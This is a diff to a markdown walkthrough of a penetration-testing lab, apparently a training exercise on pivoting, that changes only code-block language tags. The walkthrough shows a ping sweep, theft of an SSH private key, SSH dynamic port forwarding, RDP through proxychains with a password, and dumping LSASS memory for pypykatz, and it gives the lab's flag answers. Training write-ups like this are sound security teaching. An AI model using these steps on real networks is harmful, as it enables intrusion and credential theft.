@@ -17,7 +17,7 @@ A team member started a Penetration Test against the Inlanefreight environment b
    - Read the file `/home/webadmin/for-admin-eyes-only`
 3. Enumerate the internal network and discover another active host. Submit the IP address of that host as the answer. **Answer: 172.16.5.35**
    - Notice that this host is attached to an internal network 172.16.0.0/16:
-      ```sh
+      ```shellsession
       www-data@inlanefreight.local:/home/webadmin# ip a
       1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
           link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
@@ -41,7 +41,7 @@ A team member started a Penetration Test against the Inlanefreight environment b
             valid_lft forever preferred_lft forever
       ```
    - Try to do ping sweep on the 172.16.5.0/24 subnet → 172.16.5.35 is reachable:
-      ```sh
+      ```shellsession
       www-data@inlanefreight.local:/home/webadmin# bash -c 'for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &) ; done'
       64 bytes from 172.16.5.15: icmp_seq=1 ttl=64 time=0.020 ms
       64 bytes from 172.16.5.35: icmp_seq=1 ttl=128 time=1.57 ms
@@ -49,16 +49,16 @@ A team member started a Penetration Test against the Inlanefreight environment b
 4. Use the information you gathered to pivot to the discovered host. Submit the contents of C:\Flag.txt as the answer. **Answer: S1ngl3-Piv07-3@sy-Day**
    - From the webshell copy the `id_rsa` to our attack host
    - Enable dynamic port forwarding with SSH:
-      ```sh
+      ```shellsession
       $ ssh -D 9050 -i id_rsa webadmin@10.129.229.129
       ```
    - RDP to the discovered host (172.16.5.35) through the proxychain and read the flag at `C:\Flag.txt`:
-      ```sh
+      ```shellsession
       $ proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work! /drive:linux,/home/htb-ac-xxx/Downloads'
       ```
 5. In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable? **Answer: vfrank**
    - On the RDP session, dump the LSASS process memory and transfer it to attack host to extract credentials using `pypykatz`:
-      ```sh
+      ```shellsession
       $ pypykatz lsa minidump lsass.dmp
       <SNIP>
       == LogonSession ==
